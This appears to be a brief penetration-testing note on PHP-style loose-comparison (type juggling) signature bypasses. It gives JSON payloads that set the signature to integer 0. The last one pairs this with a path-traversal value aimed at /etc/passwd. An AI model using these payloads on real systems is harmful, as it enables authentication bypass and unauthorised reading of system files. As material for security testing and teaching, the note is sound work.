### Test for loose comparison  
Condsider the below JSON:  
```
{ "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjEiO3M6NToibG9naW4iO3M6MzoieHl6Ijt9--7b03604a9f3aae595030f67cb4f8bf5a", 
"uuid": "file5fb5d349059515fb5d34905ad8", 
"sig": "852ab168684cd46deedc20d0abcd30f6"}
```

We can check for a loose comparion in the signature by removing the quotes around the value and removing everything after the first lot of decimals EG
```
{ "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjEiO3M6NToibG9naW4iO3M6MzoieHl6Ijt9--7b03604a9f3aae595030f67cb4f8bf5a", 
"uuid": "file5fb5d349059515fb5d34905ad8", 
"sig": 852}
```

### ^^^ If this is the case, we can that type juggle
As per below, we keep changing the path until eventually the signature starts with `a,b,c,d,e or f`, in which case it will be cast an integer, with it's value as 0
```
{ "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjEiO3M6NToibG9naW4iO3M6MzoieHl6Ijt9--7b03604a9f3aae595030f67cb4f8bf5a", 
"uuid": "../../.././././etc/passwd", 
"sig": 0}
```
